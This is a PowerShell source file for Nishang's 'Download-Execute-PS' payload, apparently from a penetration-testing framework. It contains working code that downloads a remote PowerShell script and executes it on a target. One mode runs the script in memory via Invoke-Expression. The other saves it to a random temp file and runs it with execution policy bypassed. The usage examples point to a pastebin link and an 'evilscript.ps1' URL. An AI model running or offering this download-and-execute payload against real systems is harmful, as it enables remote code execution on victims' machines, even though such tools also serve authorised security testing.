
function Download-Execute-PS
{
<#
.SYNOPSIS
Nishang Payload which downloads and executes a powershell script.

.DESCRIPTION
This payload downloads a powershell script from specified URL and then executes it on the target.
Use the -nowdownload option to avoid saving the script on the target. Otherwise, the script is saved with a random filename.

.PARAMETER ScriptURL
The URL from where the powershell script would be downloaded.

.PARAMETER Arguments
The Arguments to pass to the script when it is not downloaded to disk i.e. with -nodownload function.
This is to be used when the scripts load a function in memory, true for most scripts in Nishang.

.PARAMETER Nodownload
If this switch is used, the script is not dowloaded to the disk.

.EXAMPLE
PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x

.EXAMPLE
PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript.ps1 -Argument evilscript -nodownload
The above command does not download the script file to disk and executes the evilscript function inside the evilscript.ps1

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptURL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Arguments,

        [Switch]
        $nodownload
    )
    if ($nodownload -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
        if($Arguments)
        {
            Invoke-Expression $Arguments
        }
    }
    else
    {
        $rand = Get-Random
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\$rand.ps1"
        $webclient.DownloadFile($ScriptURL,"$file1")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
        Invoke-Expression $pastevalue
    }
}


